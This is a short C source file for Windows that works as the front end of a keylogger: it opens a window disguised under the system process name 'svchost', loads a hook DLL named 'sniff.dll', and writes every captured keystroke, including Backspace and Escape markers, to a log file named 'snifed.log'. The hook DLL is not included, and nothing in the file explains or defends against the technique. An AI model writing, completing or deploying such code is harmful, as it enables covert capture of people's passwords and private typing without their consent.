#include <windows.h>
#include <stdio.h>

LRESULT CALLBACK LogWndProc(HWND, UINT, UINT, LONG);

#define WM_HOOKMESSAGE WM_USER+1

HWND hWnd;
HINSTANCE hDllInst;

int (* SetHook)(HWND, UINT);
int (* UnSetHook)();

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	MSG msg;
	WNDCLASS wc;
	memset(&wc, 0,sizeof(wc));
	wc.lpszClassName = "Sniffer";
	wc.hInstance = hInstance;
	wc.lpfnWndProc = LogWndProc;
	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.hbrBackground = (HBRUSH)(COLOR_MENU+1);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);

	RegisterClass(&wc);
	hWnd = CreateWindowEx(0,"svchost","svchost",
		WS_POPUP | WS_CAPTION| WS_SYSMENU| WS_THICKFRAME,
		0,0,200,200,
		NULL, NULL, hInstance, 0);

	hDllInst = LoadLibrary((LPCSTR) "sniff.dll");

	if(hDllInst)
	{
		SetHook = (int (*)(HWND, UINT))GetProcAddress(hDllInst, "SetHook");
		UnSetHook = (int (*)())GetProcAddress(hDllInst, "UnSetHook");
	}

	if(SetHook)SetHook(hWnd, WM_HOOKMESSAGE);

	while (GetMessage(&msg, NULL, 0,0)) 
	{
		DispatchMessage(&msg);
	}

	if(UnSetHook)UnSetHook();

	if(IsWindow(hWnd))
		DestroyWindow(hWnd);
	if(hDllInst)FreeLibrary(hDllInst);
	return 0;
}
LRESULT CALLBACK LogWndProc(HWND hWnd, UINT Message, UINT wParam, LONG lParam)
{
	FILE *f = fopen("snifed.log", "a");

	switch(Message)
	{
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	case WM_HOOKMESSAGE:
		switch(wParam)
		{
		case 0x08: fprintf(f,"<BkSp>");break;
		case 0x1b: fprintf(f,"<Esc>");break;
		case 0x0d: fprintf(f,"\n");break;
		default:
			fprintf(f,"%c",wParam);

		}break;
	case WM_DESTROY:
	case WM_ENDSESSION:
		PostQuitMessage(0);
		break;
	}
	fclose(f);
	return DefWindowProc(hWnd, Message, wParam, lParam);
}